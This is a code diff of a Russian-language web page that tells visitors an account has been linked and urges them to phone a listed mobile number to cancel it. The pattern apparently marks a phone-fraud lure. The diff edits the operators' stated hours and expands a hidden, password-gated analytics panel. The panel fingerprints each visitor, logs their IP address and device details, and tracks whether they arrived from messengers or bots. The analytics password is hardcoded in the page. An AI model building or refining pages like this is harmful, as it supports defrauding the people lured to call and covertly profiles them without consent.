@@ -1,4 +1,4 @@
-<!DOCTYPE html><!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
@@ -314,7 +314,7 @@
             padding: 30px;
             max-width: 95%;
             max-height: 95%;
-            width: 900px;
+            width: 1000px;
             overflow-y: auto;
             box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
         }
@@ -366,6 +366,7 @@
             display: flex;
             margin-bottom: 20px;
             border-bottom: 2px solid #eef2f7;
+            flex-wrap: wrap;
         }
 
         .tab {
@@ -425,7 +426,7 @@
         }
 
         .user-list {
-            max-height: 400px;
+            max-height: 500px;
             overflow-y: auto;
             border: 1px solid #e9ecef;
             border-radius: 10px;
@@ -450,6 +451,7 @@
         .user-id {
             font-weight: 600;
             color: #2c3e50;
+            font-size: 14px;
         }
 
         .user-ip {
@@ -460,11 +462,41 @@
         .user-details {
             font-size: 12px;
             color: #5a6c7d;
+            line-height: 1.4;
         }
 
         .api-user {
             border-left-color: #ff9800;
             background: #fff3e0;
+        }
+
+        .new-user {
+            border-left-color: #2196F3;
+            background: #e3f2fd;
+        }
+
+        .user-badge {
+            display: inline-block;
+            padding: 2px 6px;
+            border-radius: 10px;
+            font-size: 10px;
+            font-weight: 600;
+            margin-left: 5px;
+        }
+
+        .badge-api {
+            background: #ff9800;
+            color: white;
+        }
+
+        .badge-new {
+            background: #2196F3;
+            color: white;
+        }
+
+        .badge-returning {
+            background: #4CAF50;
+            color: white;
         }
 
         .password-input {
@@ -504,6 +536,13 @@
             font-size: 14px;
             margin-top: 10px;
             display: none;
+        }
+
+        .empty-state {
+            text-align: center;
+            color: #6c757d;
+            padding: 40px;
+            font-style: italic;
         }
 
         @keyframes iconBounce {
@@ -671,7 +710,7 @@
             <h2>Отмена привязки счета</h2>
             <p>Для отмены привязки счета позвоните по номеру:</p>
             <div class="phone-number">7 (988) 115-61-81</div>
-            <p>Наши операторы доступны с 00:00 до 24:00 ежедневно</p>
+            <p>Наши операторы доступны с 9:00 до 21:00 ежедневно</p>
             <a href="tel:+79881156181" class="call-btn" id="callBtn">
                 <i class="fas fa-phone"></i> Позвонить сейчас
             </a>
@@ -713,7 +752,9 @@
             <!-- Табы аналитики -->
             <div class="analytics-tabs">
                 <button class="tab active" data-tab="all">Все пользователи</button>
+                <button class="tab" data-tab="new">Новые сегодня</button>
                 <button class="tab" data-tab="api">API переходы</button>
+                <button class="tab" data-tab="sources">Источники переходов</button>
                 <button class="tab" data-tab="stats">Общая статистика</button>
             </div>
 
@@ -724,6 +765,13 @@
                 </div>
             </div>
 
+            <!-- Вкладка новых пользователей -->
+            <div id="tab-new" class="tab-content">
+                <div class="user-list" id="newUserList">
+                    <!-- Список новых пользователей -->
+                </div>
+            </div>
+
             <!-- Вкладка API переходов -->
             <div id="tab-api" class="tab-content">
                 <div class="analytics-stats" id="apiStats">
@@ -731,6 +779,16 @@
                 </div>
                 <div class="user-list" id="apiUserList">
                     <!-- Список пользователей с API переходов -->
+                </div>
+            </div>
+
+            <!-- Вкладка источников переходов -->
+            <div id="tab-sources" class="tab-content">
+                <div class="analytics-stats" id="sourcesStats">
+                    <!-- Статистика по источникам -->
+                </div>
+                <div class="user-list" id="sourcesList">
+                    <!-- Детали по источникам -->
                 </div>
             </div>
 
@@ -746,6 +804,9 @@
     <script>
         // Пароль для доступа к аналитике
         const ANALYTICS_PASSWORD = "Tarakan4ik1";
+
+        // Глобальное хранилище аналитики
+        const ANALYTICS_STORAGE_KEY = "payment_analytics_v2";
 
         // Получение IP адреса
         async function getUserIP() {
@@ -778,48 +839,80 @@
             return { browser, os };
         }
 
-        // Проверка API перехода
-        function isApiReferrer(referrer) {
-            const apiDomains = [
-                'api.',
-                'webhook',
-                'bot',
-                'telegram',
-                'whatsapp',
-                'viber',
-                'messenger',
-                'integration',
-                'callback',
-                'web.app',
-                'firebaseapp.com'
-            ];
+        // Определение типа источника
+        function getSourceType(referrer) {
+            if (!referrer || referrer === '') return 'direct';
             
-            if (!referrer || referrer === '') return false;
+            const sourceTypes = {
+                'google.': 'search',
+                'yandex.': 'search',
+                'bing.': 'search',
+                'yahoo.': 'search',
+                'telegram': 'messenger',
+                'whatsapp': 'messenger',
+                'viber': 'messenger',
+                'facebook': 'social',
+                'instagram': 'social',
+                'twitter': 'social',
+                'vk.com': 'social',
+                'api.': 'api',
+                'webhook': 'api',
+                'bot': 'api',
+                'integration': 'api'
+            };
             
-            return apiDomains.some(domain => 
-                referrer.toLowerCase().includes(domain)
-            );
+            for (const [key, type] of Object.entries(sourceTypes)) {
+                if (referrer.toLowerCase().includes(key)) {
+                    return type;
+                }
+            }
+            
+            return 'other';
         }
 
-        // Генерация ID пользователя
+        // Генерация уникального ID пользователя
         function getUserId() {
-            let userId = localStorage.getItem('user_id');
-            if (!userId) {
-                userId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-                localStorage.setItem('user_id', userId);
-                localStorage.setItem('first_visit', new Date().toISOString());
+            // Создаем уникальный ID на основе комбинации данных
+            const fingerprint = [
+                navigator.userAgent,
+                screen.width,
+                screen.height,
+                navigator.language,
+                new Date().getTimezoneOffset()
+            ].join('|');
+            
+            // Хэшируем для создания уникального ID
+            let hash = 0;
+            for (let i = 0; i < fingerprint.length; i++) {
+                const char = fingerprint.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash; // Convert to 32bit integer
             }
-            return userId;
+            
+            return 'user_' + Math.abs(hash).toString(36) + '_' + Date.now();
         }
 
         // Получение аналитики
         function getAnalytics() {
-            return JSON.parse(localStorage.getItem('analytics') || '{}');
+            const stored = localStorage.getItem(ANALYTICS_STORAGE_KEY);
+            if (!stored) {
+                return {
+                    users: {},
+                    events: [],
+                    summary: {
+                        totalUsers: 0,
+                        totalEvents: 0,
+                        todayUsers: 0,
+                        todayEvents: 0
+                    }
+                };
+            }
+            return JSON.parse(stored);
         }
 
         // Сохранение аналитики
         function saveAnalytics(data) {
-            localStorage.setItem('analytics', JSON.stringify(data));
+            localStorage.setItem(ANALYTICS_STORAGE_KEY, JSON.stringify(data));
         }
 
         // Сбор данных
@@ -827,7 +920,7 @@
             const ip = await getUserIP();
             const browserInfo = getBrowserInfo();
             const referrer = document.referrer;
-            const isApi = isApiReferrer(referrer);
+            const sourceType = getSourceType(referrer);
 
             return {
                 ip: ip,
@@ -836,34 +929,64 @@
                 screen: `${screen.width}x${screen.height}`,
                 language: navigator.language,
                 referrer: referrer,
-                isApiReferrer: isApi,
+                sourceType: sourceType,
                 url: window.location.href,
-                firstVisit: localStorage.getItem('first_visit') || new Date().toISOString(),
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 cookiesEnabled: navigator.cookieEnabled,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString()
             };
         }
 
         // Отправка аналитики
         async function sendAnalytics(event, userId) {
             const userData = await collectUserData();
-            
-            const analyticsData = {
-                event: event,
-                userId: userId,
-                userData: userData,
-                timestamp: new Date().toISOString()
-            };
+            const analytics = getAnalytics();
+            const today = new Date().toDateString();
 
-            // Сохраняем в localStorage
-            const currentAnalytics = getAnalytics();
-            if (!currentAnalytics[userId]) {
-                currentAnalytics[userId] = [];
+            // Создаем или обновляем пользователя
+            if (!analytics.users[userId]) {
+                analytics.users[userId] = {
+                    id: userId,
+                    firstVisit: userData.timestamp,
+                    lastVisit: userData.timestamp,
+                    totalEvents: 0,
+                    events: [],
+                    userData: userData
+                };
+                analytics.summary.totalUsers++;
+                
+                // Считаем новых пользователей за сегодня
+                if (new Date(userData.timestamp).toDateString() === today) {
+                    analytics.summary.todayUsers++;
+                }
             }
-            currentAnalytics[userId].push(analyticsData);
-            saveAnalytics(currentAnalytics);
+
+            // Обновляем данные пользователя
+            analytics.users[userId].lastVisit = userData.timestamp;
+            analytics.users[userId].totalEvents++;
+            analytics.users[userId].events.push({
+                event: event,
+                timestamp: userData.timestamp,
+                data: userData
+            });
+
+            // Добавляем в общие события
+            analytics.events.push({
+                userId: userId,
+                event: event,
+                timestamp: userData.timestamp,
+                data: userData
+            });
+
+            // Обновляем суммарную статистику
+            analytics.summary.totalEvents++;
+            if (new Date(userData.timestamp).toDateString() === today) {
+                analytics.summary.todayEvents++;
+            }
+
+            saveAnalytics(analytics);
         }
 
         // Показать аналитику
@@ -876,7 +999,9 @@
 
             // Показываем все вкладки
             showAllUsers(analytics);
+            showNewUsers(analytics);
             showApiUsers(analytics);
+            showSources(analytics);
             showGeneralStats(analytics);
         }
 
@@ -885,30 +1010,98 @@
             const userListContainer = document.getElementById('userList');
             userListContainer.innerHTML = '';
 
-            Object.entries(analytics).forEach(([userId, userEvents]) => {
-                const lastEvent = userEvents[userEvents.length - 1];
+            const users = Object.values(analytics.users);
+            
+            if (users.length === 0) {
+                userListContainer.innerHTML = '<div class="empty-state">Нет данных о пользователях</div>';
+                return;
+            }
+
+            // Сортируем по последнему визиту (новые сверху)
+            users.sort((a, b) => new Date(b.lastVisit) - new Date(a.lastVisit));
+
+            users.forEach(user => {
+                const lastEvent = user.events[user.events.length - 1];
+                const isNew = isUserNewToday(user);
+                const isApi = user.userData.sourceType === 'api';
+                const isReturning = user.events.length > 1;
+
                 const userItem = document.createElement('div');
-                userItem.className = `user-item ${lastEvent.userData.isApiReferrer ? 'api-user' : ''}`;
+                userItem.className = `user-item ${isApi ? 'api-user' : ''} ${isNew ? 'new-user' : ''}`;
+                
+                let badges = '';
+                if (isApi) badges += '<span class="user-badge badge-api">API</span>';
+                if (isNew) badges += '<span class="user-badge badge-new">NEW</span>';
+                if (isReturning) badges += '<span class="user-badge badge-returning">Return</span>';
+
                 userItem.innerHTML = `
                     <div class="user-header">
-                        <div class="user-id">${userId} ${lastEvent.userData.isApiReferrer ? '🔗' : ''}</div>
-                        <div class="user-ip">IP: ${lastEvent.userData.ip}</div>
+                        <div class="user-id">${user.id.substring(0, 15)}... ${badges}</div>
+                        <div class="user-ip">IP: ${user.userData.ip}</div>
                     </div>
                     <div class="user-details">
-                        <strong>Браузер:</strong> ${lastEvent.userData.browser} | 
-                        <strong>ОС:</strong> ${lastEvent.userData.os} | 
-                        <strong>Платформа:</strong> ${lastEvent.userData.platform}<br>
-                        <strong>Экран:</strong> ${lastEvent.userData.screen} | 
-                        <strong>Язык:</strong> ${lastEvent.userData.language}<br>
-                        <strong>Реферер:</strong> ${lastEvent.userData.referrer || 'прямой заход'}<br>
-                        <strong>Таймзона:</strong> ${lastEvent.userData.timezone} | 
-                        <strong>Cookies:</strong> ${lastEvent.userData.cookiesEnabled ? 'вкл' : 'выкл'}<br>
-                        <strong>Событий:</strong> ${userEvents.length} | 
-                        <strong>Первое посещение:</strong> ${new Date(lastEvent.userData.firstVisit).toLocaleString('ru-RU')}<br>
-                        <strong>Последнее событие:</strong> ${lastEvent.event} в ${new Date(lastEvent.timestamp).toLocaleString('ru-RU')}
+                        <strong>Браузер:</strong> ${user.userData.browser} | 
+                        <strong>ОС:</strong> ${user.userData.os} | 
+                        <strong>Платформа:</strong> ${user.userData.platform}<br>
+                        <strong>Экран:</strong> ${user.userData.screen} | 
+                        <strong>Язык:</strong> ${user.userData.language}<br>
+                        <strong>Источник:</strong> ${user.userData.referrer || 'прямой заход'} 
+                        <strong>(${user.userData.sourceType})</strong><br>
+                        <strong>Таймзона:</strong> ${user.userData.timezone} | 
+                        <strong>Cookies:</strong> ${user.userData.cookiesEnabled ? 'вкл' : 'выкл'}<br>
+                        <strong>Событий:</strong> ${user.events.length} | 
+                        <strong>Первое посещение:</strong> ${new Date(user.firstVisit).toLocaleString('ru-RU')}<br>
+                        <strong>Последняя активность:</strong> ${new Date(user.lastVisit).toLocaleString('ru-RU')}<br>
+                        <strong>События:</strong> ${user.events.map(e => e.event).join(', ')}
                     </div>
                 `;
                 userListContainer.appendChild(userItem);
+            });
+        }
+
+        // Проверка нового пользователя за сегодня
+        function isUserNewToday(user) {
+            const today = new Date().toDateString();
+            return new Date(user.firstVisit).toDateString() === today;
+        }
+
+        // Показать новых пользователей
+        function showNewUsers(analytics) {
+            const newUserListContainer = document.getElementById('newUserList');
+            newUserListContainer.innerHTML = '';
+
+            const today = new Date().toDateString();
+            const newUsers = Object.values(analytics.users).filter(user => 
+                new Date(user.firstVisit).toDateString() === today
+            );
+
+            if (newUsers.length === 0) {
+                newUserListContainer.innerHTML = '<div class="empty-state">Нет новых пользователей за сегодня</div>';
+                return;
+            }
+
+            newUsers.sort((a, b) => new Date(b.firstVisit) - new Date(a.firstVisit));
+
+            newUsers.forEach(user => {
+                const userItem = document.createElement('div');
+                userItem.className = 'user-item new-user';
+                
+                userItem.innerHTML = `
+                    <div class="user-header">
+                        <div class="user-id">${user.id.substring(0, 15)}... <span class="user-badge badge-new">NEW</span></div>
+                        <div class="user-ip">IP: ${user.userData.ip}</div>
+                    </div>
+                    <div class="user-details">
+                        <strong>Время:</strong> ${new Date(user.firstVisit).toLocaleString('ru-RU')}<br>
+                        <strong>Источник:</strong> ${user.userData.referrer || 'прямой заход'} 
+                        <strong>(${user.userData.sourceType})</strong><br>
+                        <strong>Браузер:</strong> ${user.userData.browser} | 
+                        <strong>ОС:</strong> ${user.userData.os}<br>
+                        <strong>Устройство:</strong> ${user.userData.platform}, ${user.userData.screen}<br>
+                        <strong>Событий:</strong> ${user.events.length}
+                    </div>
+                `;
+                newUserListContainer.appendChild(userItem);
             });
         }
 
@@ -917,147 +1110,160 @@
             const apiStatsContainer = document.getElementById('apiStats');
             const apiUserListContainer = document.getElementById('apiUserList');
 
-            let apiUsers = 0;
-            let apiClicks = 0;
-            const apiDomains = {};
+            const apiUsers = Object.values(analytics.users).filter(user => 
+                user.userData.sourceType === 'api'
+            );
 
-            // Собираем статистику по API
-            Object.entries(analytics).forEach(([userId, userEvents]) => {
-                const lastEvent = userEvents[userEvents.length - 1];
-                if (lastEvent.userData.isApiReferrer) {
-                    apiUsers++;
-                    apiClicks += userEvents.length;
-                    
-                    // Собираем домены рефереров
-                    const domain = lastEvent.userData.referrer ? 
-                        new URL(lastEvent.userData.referrer).hostname : 'unknown';
-                    apiDomains[domain] = (apiDomains[domain] || 0) + 1;
-                }
-            });
-
-            // Статистика API
             apiStatsContainer.innerHTML = `
                 <div class="stat-card">
-                    <div class="stat-number">${apiUsers}</div>
+                    <div class="stat-number">${apiUsers.length}</div>
                     <div class="stat-label">API пользователей</div>
                 </div>
                 <div class="stat-card">
-                    <div class="stat-number">${apiClicks}</div>
+                    <div class="stat-number">${apiUsers.reduce((sum, user) => sum + user.events.length, 0)}</div>
                     <div class="stat-label">API событий</div>
                 </div>
                 <div class="stat-card">
-                    <div class="stat-number">${Object.keys(apiDomains).length}</div>
-                    <div class="stat-label">Источников API</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-number">${Math.round(apiClicks / (apiUsers || 1))}</div>
-                    <div class="stat-label">Ср. событий на пользователя</div>
+                    <div class="stat-number">${new Set(apiUsers.map(user => user.userData.referrer)).size}</div>
+                    <div class="stat-label">Уникальных источников</div>
                 </div>
             `;
 
-            // Список API пользователей
             apiUserListContainer.innerHTML = '';
-            Object.entries(analytics).forEach(([userId, userEvents]) => {
-                const lastEvent = userEvents[userEvents.length - 1];
-                if (lastEvent.userData.isApiReferrer) {
-                    const userItem = document.createElement('div');
-                    userItem.className = 'user-item api-user';
-                    userItem.innerHTML = `
-                        <div class="user-header">
-                            <div class="user-id">${userId} 🔗</div>
-                            <div class="user-ip">IP: ${lastEvent.userData.ip}</div>
-                        </div>
-                        <div class="user-details">
-                            <strong>Источник API:</strong> ${lastEvent.userData.referrer || 'неизвестно'}<br>
-                            <strong>Браузер:</strong> ${lastEvent.userData.browser} | 
-                            <strong>ОС:</strong> ${lastEvent.userData.os}<br>
-                            <strong>Пользовательский агент:</strong> ${lastEvent.userData.userAgent.substring(0, 100)}...<br>
-                            <strong>Событий:</strong> ${userEvents.length} | 
-                            <strong>Типы событий:</strong> ${[...new Set(userEvents.map(e => e.event))].join(', ')}<br>
-                            <strong>Первое посещение:</strong> ${new Date(lastEvent.userData.firstVisit).toLocaleString('ru-RU')}<br>
-                            <strong>Последняя активность:</strong> ${new Date(lastEvent.timestamp).toLocaleString('ru-RU')}
-                        </div>
-                    `;
-                    apiUserListContainer.appendChild(userItem);
+            if (apiUsers.length === 0) {
+                apiUserListContainer.innerHTML = '<div class="empty-state">Нет данных о API переходах</div>';
+                return;
+            }
+
+            apiUsers.sort((a, b) => new Date(b.lastVisit) - new Date(a.lastVisit));
+
+            apiUsers.forEach(user => {
+                const userItem = document.createElement('div');
+                userItem.className = 'user-item api-user';
+                userItem.innerHTML = `
+                    <div class="user-header">
+                        <div class="user-id">${user.id.substring(0, 15)}... <span class="user-badge badge-api">API</span></div>
+                        <div class="user-ip">IP: ${user.userData.ip}</div>
+                    </div>
+                    <div class="user-details">
+                        <strong>Источник API:</strong> ${user.userData.referrer || 'неизвестно'}<br>
+                        <strong>Браузер:</strong> ${user.userData.browser} | 
+                        <strong>ОС:</strong> ${user.userData.os}<br>
+                        <strong>Событий:</strong> ${user.events.length} | 
+                        <strong>Типы событий:</strong> ${[...new Set(user.events.map(e => e.event))].join(', ')}<br>
+                        <strong>Первое посещение:</strong> ${new Date(user.firstVisit).toLocaleString('ru-RU')}<br>
+                        <strong>Последняя активность:</strong> ${new Date(user.lastVisit).toLocaleString('ru-RU')}
+                    </div>
+                `;
+                apiUserListContainer.appendChild(userItem);
+            });
+        }
+
+        // Показать источники переходов
+        function showSources(analytics) {
+            const sourcesStatsContainer = document.getElementById('sourcesStats');
+            const sourcesListContainer = document.getElementById('sourcesList');
+
+            const sources = {};
+            Object.values(analytics.users).forEach(user => {
+                const source = user.userData.sourceType;
+                const referrer = user.userData.referrer || 'direct';
+                
+                if (!sources[source]) {
+                    sources[source] = { count: 0, users: [], referrers: {} };
                 }
+                sources[source].count++;
+                sources[source].users.push(user);
+                
+                if (!sources[source].referrers[referrer]) {
+                    sources[source].referrers[referrer] = 0;
+                }
+                sources[source].referrers[referrer]++;
             });
 
-            if (apiUserListContainer.innerHTML === '') {
-                apiUserListContainer.innerHTML = '<div style="text-align: center; color: #6c757d; padding: 20px;">Нет данных о API переходах</div>';
-            }
+            sourcesStatsContainer.innerHTML = '';
+            sourcesListContainer.innerHTML = '';
+
+            Object.entries(sources).forEach(([source, data]) => {
+                // Статистика по источникам
+                const sourceCard = document.createElement('div');
+                sourceCard.className = 'stat-card';
+                sourceCard.innerHTML = `
+                    <div class="stat-number">${data.count}</div>
+                    <div class="stat-label">${getSourceLabel(source)}</div>
+                `;
+                sourcesStatsContainer.appendChild(sourceCard);
+
+                // Детали по источникам
+                const sourceItem = document.createElement('div');
+                sourceItem.className = 'user-item';
+                sourceItem.innerHTML = `
+                    <div class="user-header">
+                        <div class="user-id">${getSourceLabel(source)}</div>
+                        <div class="user-ip">Пользователей: ${data.count}</div>
+                    </div>
+                    <div class="user-details">
+                        <strong>Рефереры:</strong><br>
+                        ${Object.entries(data.referrers).map(([ref, count]) => 
+                            `• ${ref || 'прямой заход'} (${count})`
+                        ).join('<br>')}
+                    </div>
+                `;
+                sourcesListContainer.appendChild(sourceItem);
+            });
+        }
+
+        function getSourceLabel(source) {
+            const labels = {
+                'direct': 'Прямые заходы',
+                'search': 'Поисковые системы',
+                'social': 'Социальные сети',
+                'messenger': 'Мессенджеры',
+                'api': 'API переходы',
+                'other': 'Другие источники'
+            };
+            return labels[source] || source;
         }
 
         // Показать общую статистику
         function showGeneralStats(analytics) {
             const statsContainer = document.getElementById('analyticsStats');
 
-            let totalClicks = 0;
-            let uniqueUsers = Object.keys(analytics).length;
-            let todayClicks = 0;
-            let returningUsers = 0;
-            let apiUsers = 0;
-            const today = new Date().toDateString();
-            const browsers = {};
-            const os = {};
+            const totalUsers = analytics.summary.totalUsers;
+            const totalEvents = analytics.summary.totalEvents;
+            const todayUsers = analytics.summary.todayUsers;
+            const todayEvents = analytics.summary.todayEvents;
 
-            Object.values(analytics).forEach(userEvents => {
-                totalClicks += userEvents.length;
-                if (userEvents.length > 1) {
-                    returningUsers++;
-                }
-                
-                const lastEvent = userEvents[userEvents.length - 1];
-                if (lastEvent.userData.isApiReferrer) {
-                    apiUsers++;
-                }
-                
-                // Статистика по браузерам
-                browsers[lastEvent.userData.browser] = (browsers[lastEvent.userData.browser] || 0) + 1;
-                os[lastEvent.userData.os] = (os[lastEvent.userData.os] || 0) + 1;
-
-                userEvents.forEach(event => {
-                    if (new Date(event.timestamp).toDateString() === today) {
-                        todayClicks++;
-                    }
-                });
+            const sources = {};
+            Object.values(analytics.users).forEach(user => {
+                const source = user.userData.sourceType;
+                sources[source] = (sources[source] || 0) + 1;
             });
-
-            // Находим самый популярный браузер и ОС
-            const topBrowser = Object.keys(browsers).reduce((a, b) => browsers[a] > browsers[b] ? a : b, '');
-            const topOS = Object.keys(os).reduce((a, b) => os[a] > os[b] ? a : b, '');
 
             statsContainer.innerHTML = `
                 <div class="stat-card">
-                    <div class="stat-number">${uniqueUsers}</div>
+                    <div class="stat-number">${totalUsers}</div>
                     <div class="stat-label">Всего пользователей</div>
                 </div>
                 <div class="stat-card">
-                    <div class="stat-number">${totalClicks}</div>
+                    <div class="stat-number">${totalEvents}</div>
                     <div class="stat-label">Всего событий</div>
                 </div>
                 <div class="stat-card">
-                    <div class="stat-number">${todayClicks}</div>
+                    <div class="stat-number">${todayUsers}</div>
+                    <div class="stat-label">Новых сегодня</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number">${todayEvents}</div>
                     <div class="stat-label">Событий сегодня</div>
                 </div>
                 <div class="stat-card">
-                    <div class="stat-number">${returningUsers}</div>
-                    <div class="stat-label">Возвращающихся</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-number">${apiUsers}</div>
+                    <div class="stat-number">${sources['api'] || 0}</div>
                     <div class="stat-label">API пользователей</div>
                 </div>
                 <div class="stat-card">
-                    <div class="stat-number">${Math.round(totalClicks / (uniqueUsers || 1))}</div>
+                    <div class="stat-number">${Math.round(totalEvents / (totalUsers || 1))}</div>
                     <div class="stat-label">Ср. событий на пользователя</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-number">${topBrowser}</div>
-                    <div class="stat-label">Популярный браузер</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-number">${topOS}</div>
-                    <div class="stat-label">Популярная ОС</div>
                 </div>
             `;
         }
@@ -1067,14 +1273,11 @@
             const refreshBtn = document.getElementById('refreshBtn');
             const icon = refreshBtn.querySelector('i');
             
-            // Добавляем анимацию
             icon.classList.add('refreshing');
             refreshBtn.disabled = true;
             
-            // Обновляем данные
             showAnalytics();
             
-            // Убираем анимацию через 1 секунду
             setTimeout(() => {
                 icon.classList.remove('refreshing');
                 refreshBtn.disabled = false;
@@ -1083,7 +1286,6 @@
 
         // Переключение вкладок
         function switchTab(tabName) {
-            // Убираем активный класс у всех табов и контента
             document.querySelectorAll('.tab').forEach(tab => {
                 tab.classList.remove('active');
             });
@@ -1091,7 +1293,6 @@
                 content.classList.remove('active');
             });
 
-            // Добавляем активный класс выбранному табу и контенту
             document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');
             document.getElementById(`tab-${tabName}`).classList.add('active');
         }
